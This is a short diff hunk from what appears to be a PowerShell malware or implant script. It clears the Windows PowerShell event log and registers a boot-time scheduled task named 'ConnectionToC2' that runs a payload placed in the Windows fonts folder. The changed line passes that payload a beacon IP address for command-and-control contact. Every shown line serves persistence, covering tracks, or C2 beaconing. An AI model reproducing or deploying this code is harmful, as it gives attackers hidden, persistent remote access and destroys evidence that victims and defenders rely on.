@@ -33,7 +33,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /
 Clear-EventLog -LogName "Windows PowerShell"
 
 # Create scheduled task for this payload to run on boot
-$action = New-ScheduledTaskAction -Execute "C:\Windows\fonts\Javalanche.ps1"
+$action = New-ScheduledTaskAction -Execute "C:\Windows\fonts\Javalanche.ps1 -beaconIPAddress $($beaconIPAddress)"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"
 
